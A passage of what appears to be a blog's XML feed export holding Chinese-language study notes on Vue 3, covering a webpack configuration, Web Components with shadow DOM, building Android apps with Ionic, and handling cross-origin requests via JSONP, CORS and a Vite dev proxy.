class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;style-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.3.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ts-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^9.4.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.1.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.3.4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^17.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;webpack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.85.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;webpack-cli&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.1.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;webpack-dev-server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.15.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>webpack.config.js：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js基于node环境，所以需要用common js模块化</span></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Configuration</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;webpack&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> htmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">VueLoaderPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;vue-loader/dist/index&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">CleanWebpackPlugin</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;clean-webpack-plugin&quot;</span>)</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FriendlyErrorsWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;friendly-errors-webpack-plugin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@type</span> &#123;<span class="type">Configuration</span>&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="comment">// 运行模式</span></span><br><span class="line">  <span class="comment">// 开发环境中打包的代码不会被压缩</span></span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span>,</span><br><span class="line">  <span class="comment">// 入口文件</span></span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./src/main.ts&quot;</span>,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.vue$/</span>,</span><br><span class="line">        <span class="attr">use</span>: <span class="string">&quot;vue-loader&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="comment">// 使用多个loader时要注意先后顺序</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.scss$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&quot;style-loader&quot;</span>,<span class="string">&quot;css-loader&quot;</span>,<span class="string">&quot;sass-loader&quot;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&quot;style-loader&quot;</span>,<span class="string">&quot;css-loader&quot;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.ts$/</span>,</span><br><span class="line">        <span class="attr">loader</span>: <span class="string">&quot;ts-loader&quot;</span>,</span><br><span class="line">        <span class="comment">// ts-loader要针对vue单文件组件进行特殊处理</span></span><br><span class="line">        <span class="attr">options</span>: &#123;</span><br><span class="line">          <span class="attr">configFile</span>: path.<span class="title function_">resolve</span>(process.<span class="title function_">cwd</span>(),<span class="string">&quot;tsconfig.json&quot;</span>),</span><br><span class="line">          <span class="attr">appendTsSuffixTo</span>:[<span class="regexp">/\.vue$/</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 出口</span></span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="comment">// 文件名</span></span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;[hash].js&quot;</span>,</span><br><span class="line">    <span class="comment">// 输出位置</span></span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;dist&quot;</span>),</span><br><span class="line">    <span class="comment">// 每次打包钱清空输出文件夹</span></span><br><span class="line">    <span class="attr">clean</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 文件处理</span></span><br><span class="line">  <span class="attr">resolve</span>: &#123;</span><br><span class="line">    <span class="comment">// 目录别名</span></span><br><span class="line">    <span class="attr">alias</span>: &#123;</span><br><span class="line">      <span class="string">&quot;@&quot;</span>: path.<span class="title function_">resolve</span>(__dirname,<span class="string">&quot;src&quot;</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 自动识别后缀</span></span><br><span class="line">    <span class="attr">extensions</span>: [<span class="string">&quot;.vue&quot;</span>,<span class="string">&quot;.ts&quot;</span>,<span class="string">&quot;.js&quot;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 终端输出内容级别</span></span><br><span class="line">  <span class="attr">stats</span>: <span class="string">&quot;errors-only&quot;</span>,</span><br><span class="line">  <span class="comment">// 服务设置</span></span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">11451</span>,</span><br><span class="line">    <span class="attr">hot</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 插件</span></span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title function_">htmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="comment">// 应用页面</span></span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;./public/index.html&quot;</span></span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="comment">// 支持vue</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">VueLoaderPlugin</span>(),</span><br><span class="line">    <span class="comment">// 每次打包时清空输出文件夹</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">CleanWebpackPlugin</span>(),</span><br><span class="line">    <span class="comment">// 美化webpack终端输出</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">FriendlyErrorsWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">compilationSuccessInfo</span>: &#123;</span><br><span class="line">        <span class="attr">messages</span>: [<span class="string">&quot;Your application is running!&quot;</span>]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 性能优化</span></span><br><span class="line">  <span class="attr">externals</span>: &#123;</span><br><span class="line">    <span class="comment">// CDN引入vue，这样vue就不会被打进包里了</span></span><br><span class="line">    <span class="comment">// 减小体积，但是要求更好的网速</span></span><br><span class="line">    <span class="attr">vue</span>: <span class="string">&quot;Vue&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = config</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3 Web Components</title>
    <url>/web/study/Vue/43.Vue3%20Web%20Components.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Web-Components"><a href="#Web-Components" class="headerlink" title="Web Components"></a>Web Components</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Web Components提供了基于原生支持的、对视图层的封装能力。</p>
<p>它可以让单个组件相关的javaScript、css、html模板运行在以html标签为界限的局部环境中，不会影响到全局，组件间也不会相互影响。</p>
<p>就是提供了原生JS实现自定义标签的能力，并且提供了标签内完整的生命周期 。</p>
<ul>
<li>Custom elements（自定义元素）：JavaScript API，允许定义custom elements及其行为，然后按需使用。</li>
<li>Shadow DOM（影子DOM）：JavaScript API，用于将封装的”影子“DOM树附加到元素（与主文档DOM分开呈现）并控制其关联的功能。通过这种方式，保持元素的功能私有，这样它们就可以被脚本化和样式化，而不用担心与文档的其他部分发生冲突。</li>
<li>HTML templates（HTML模板）：和元素使开发者可以编写与HTML结构类似的组件和样式。然后它们可以作为自定义元素结构的基础被多次重用。</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>btn.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义元素，继承HTMLElement</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Btn</span> <span class="keyword">extends</span> <span class="title class_ inherited__">HTMLElement</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建shadowDOM</span></span><br><span class="line">    <span class="keyword">const</span> shadowDom = <span class="variable language_">this</span>.<span class="title function_">attachShadow</span>(&#123;</span><br><span class="line">      <span class="attr">mode</span>: <span class="string">&quot;open&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给shadowDOM加东西（传统方式）</span></span><br><span class="line">    <span class="comment">// this.p = this.h(&quot;p&quot;)</span></span><br><span class="line">    <span class="comment">// this.p.innerText = &quot;oh my god&quot;</span></span><br><span class="line">    <span class="comment">// this.p.setAttribute(&quot;style&quot;,&quot;width:200px;height:200px;border:1px solid black&quot;)</span></span><br><span class="line">    <span class="comment">// shadowDom.appendChild(this.p)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 给shadowDOM加东西（template方式）</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">template</span> = <span class="variable language_">this</span>.<span class="title function_">h</span>(<span class="string">&quot;template&quot;</span>)</span><br><span class="line">    <span class="comment">// 这里面写的style都会被隔离，不会影响外部</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">template</span>.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;style&gt;</span></span><br><span class="line"><span class="string">        div &#123;</span></span><br><span class="line"><span class="string">          width:200px;</span></span><br><span class="line"><span class="string">          height:200px;</span></span><br><span class="line"><span class="string">          border:1px solid black;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &lt;/style&gt;</span></span><br><span class="line"><span class="string">      &lt;div&gt;oh my god&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">    shadowDom.<span class="title function_">appendChild</span>(<span class="variable language_">this</span>.<span class="property">template</span>.<span class="property">content</span>.<span class="title function_">cloneNode</span>(<span class="literal">true</span>))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">h</span>(<span class="params">el</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">createElement</span>(el)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生命周期</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当自定义元素第一次被连接到文档DOM时被调用</span></span><br><span class="line">  <span class="title function_">connectedCallback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;connectedCallback&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//当自定义元素与文档 DOM 断开连接时被调用。</span></span><br><span class="line">  <span class="title function_">disconnectedCallback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;disconnectedCallback&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//当自定义元素被移动到新文档时被调用</span></span><br><span class="line">  <span class="title function_">adoptedCallback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;adoptedCallback&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//当自定义元素的一个属性被增加、移除或更改时被调用</span></span><br><span class="line">  <span class="title function_">attributeChangedCallback</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;attributeChangedCallback&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册自定义元素</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">customElements</span>.<span class="title function_">define</span>(<span class="string">&quot;my-btn&quot;</span>, <span class="title class_">Btn</span>)</span><br></pre></td></tr></table></figure>

<p>index.html：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./btn.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-btn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-btn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">my-btn</span>&gt;</span><span class="tag">&lt;/<span class="name">my-btn</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 这个原生div不会受影响 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>草<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面效果：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306062022280.png"></p>
<h1 id="Vue-Web-Components"><a href="#Vue-Web-Components" class="headerlink" title="Vue+Web Components"></a>Vue+Web Components</h1><p>在vite.config.ts中配置：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="title function_">vue</span>(&#123;</span><br><span class="line">      <span class="attr">template</span>: &#123;</span><br><span class="line">        <span class="attr">compilerOptions</span>: &#123;</span><br><span class="line">          <span class="comment">// 在这里注册的组件都会跳过Vue组件检测，被识别为Custom elements</span></span><br><span class="line">          <span class="attr">isCustomElement</span>:<span class="function">(<span class="params">tag</span>)=&gt;</span>tag.<span class="title function_">includes</span>(<span class="string">&quot;my-btn&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>custom-vue.ce.vue：</p>
<blockquote>
<p>后缀名为.ce.vue的文件才能被识别为Web Components。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button&gt;OH MY GOD&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">defineProps&lt;&#123;</span><br><span class="line">  obj:any</span><br><span class="line">&#125;&gt;()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped lang=&quot;scss&quot;&gt;</span><br><span class="line">button &#123;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;my-btn :obj=&quot;JSON.stringify(obj)&quot;&gt;&lt;/my-btn&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; defineCustomElement &#125; from &quot;vue&quot;</span><br><span class="line">import customVueCeVue from &quot;./components/custom-vue.ce.vue&quot;</span><br><span class="line"></span><br><span class="line">const Btn = defineCustomElement(customVueCeVue)</span><br><span class="line">window.customElements.define(&quot;my-btn&quot;,Btn)</span><br><span class="line"></span><br><span class="line">// 不能直接传参，因为参数内容会被映射到标签上</span><br><span class="line">// 于是变成了&lt;my-btn :obj=&quot;[object Object]&quot;&gt;&lt;/my-btn&gt;</span><br><span class="line">// 如果要传引用类型，只能使用stringify</span><br><span class="line">const obj = &#123;name:&quot;yajue&quot;&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>JavaScript</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue+Ionic开发移动端</title>
    <url>/web/study/Vue/45.Vue+Ionic%E5%BC%80%E5%8F%91%E7%A7%BB%E5%8A%A8%E7%AB%AF.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>前置条件：安装Java环境和安卓编辑器SDK</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g @ionic/cli</span><br></pre></td></tr></table></figure>

<p>创建项目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ionic start [name] [template] --[options]</span><br><span class="line">#            名称      模板    类型为vue项目</span><br><span class="line">ionic start app tabs --type vue</span><br></pre></td></tr></table></figure>

<p>如果项目里没有node_modules，需要手动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h1 id="生成项目"><a href="#生成项目" class="headerlink" title="生成项目"></a>生成项目</h1><p>首先将项目打包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<p>打包后，将ionic项目变成安卓项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ionic capacitor copy android	# 或ios</span><br></pre></td></tr></table></figure>

<p>生成的项目中，如果没有capactior.settings.gradle，说明项目存在问题，重新转化直到出现该文件即可</p>
<p>使用安卓studio预览生成的项目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ionic capacitor copy android</span><br></pre></td></tr></table></figure>

<h1 id="热更新"><a href="#热更新" class="headerlink" title="热更新"></a>热更新</h1><p>菜单File→Setting→System Settings→Android SDK→SDK Tools，勾选Google USB Driver并下载</p>
<p>需要使用数据线链接实际的安卓手机，开启开发者模式，打开USB调试</p>
<p>android studio右上角就会多出这个手机的选项</p>
<p>手机和电脑连上同一个wifi，回到ionic项目，开启热更新浏览：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ionic capacitor run android -l --external</span><br></pre></td></tr></table></figure>

<p>安装好安装包，可以热更新了</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Proxy跨域</title>
    <url>/web/study/Vue/44.Proxy%E8%B7%A8%E5%9F%9F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h1><p>浏览器具有同源策略的限制，它是浏览器最核心也最基本的安全功能。</p>
<p>当一个请求url的 协议、域名、端口，三者之间任意一个与当前页面url不同，都会造成跨域。</p>
<p>例如：</p>
<ul>
<li><code>http://xxxx.com</code> → <code>https://xxxx.com</code>存在跨域，因为协议不同</li>
<li>127.x.x.x:8001 → 127.x.x.x:8002存在跨域，因为端口不同</li>
<li><code>www.xxxx.com</code> → <code>www.yyyy.com</code>存在跨域，因为域名不同</li>
</ul>
<h1 id="解决跨域"><a href="#解决跨域" class="headerlink" title="解决跨域"></a>解决跨域</h1><h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>老方案，利用了HTML里script元素标签没有跨域限制的基本原理。</p>
<p>动态创建script标签，将src作为服务器地址，服务器返回一个callback接受返回的参数。</p>
<p>只能使用GET请求。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> obj, s</span><br><span class="line">  obj = &#123; <span class="string">&quot;table&quot;</span>:<span class="string">&quot;products&quot;</span>, <span class="string">&quot;limit&quot;</span>:<span class="number">10</span> &#125;; <span class="comment">//添加参数</span></span><br><span class="line">  s =  <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>); <span class="comment">//动态创建script</span></span><br><span class="line">  s.<span class="property">src</span> = <span class="string">&quot;接口地址xxxxxxxxxxxx&quot;</span>  + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//与后端定义callback名称</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunc</span>(<span class="params">myObj</span>)  &#123;</span><br><span class="line">  <span class="comment">//接受后端返回的参数</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = myObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>设置CORS允许跨域资源共享，需要后端设置。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Access-Control-Allow-Origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://web.xxx.com&quot;</span> <span class="comment">//可以指定地址</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Access-Control-Allow-Origin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span> <span class="comment">//也可以使用通配符，任何地址都能访问，但安全性不高，而且不能使用cookie</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="proxy代理"><a href="#proxy代理" class="headerlink" title="proxy代理"></a>proxy代理</h2><p>Vite proxy、node代理或webpack proxy，都是代理。</p>
<p>用node模拟一个简单的接口：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建get请求</span></span><br><span class="line"><span class="comment">// req接收前端传的参数</span></span><br><span class="line"><span class="comment">// res给前端返回参数</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/omg&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">   res.<span class="title function_">json</span>(&#123;</span><br><span class="line">      <span class="attr">code</span>:<span class="number">200</span>,</span><br><span class="line">      <span class="attr">message</span>:<span class="string">&quot;请求成功&quot;</span></span><br><span class="line">   &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 端口号9001</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9001</span>,<span class="function">()=&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;监听&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>前端发送请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">  import &#123;ref,reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">  fetch(&#x27;http://localhost:9001/omg&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这样直接请求会发生跨域问题，因为后端服务和前端服务的端口不一致</p>
<p>所以需要在vite.config.ts里配置代理：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="comment">// 后端服务的地址</span></span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:9001&quot;</span>,</span><br><span class="line">        <span class="comment">// 请求的时候使用/api即可，vite会将其替换成&quot;&quot;</span></span><br><span class="line">        <span class="attr">rewrite</span>: <span class="function">(<span class="params">path</span>)=&gt;</span> path.<span class="title function_">replace</span>(<span class="regexp">/^\/api/</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>再次发送请求：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">  import &#123;ref,reactive &#125; from &#x27;vue&#x27;</span><br><span class="line">  fetch(&#x27;/api/omg&#x27;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>proxy代理只适用于开发环境，程序上线后没有node环境，所以无法代理。若有需要，可以使用nginx。</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟DOM和diff算法</title>
    <url>/web/study/Vue/5.%E8%99%9A%E6%8B%9FDOM%E5%92%8Cdiff%E7%AE%97%E6%B3%95.html</url>
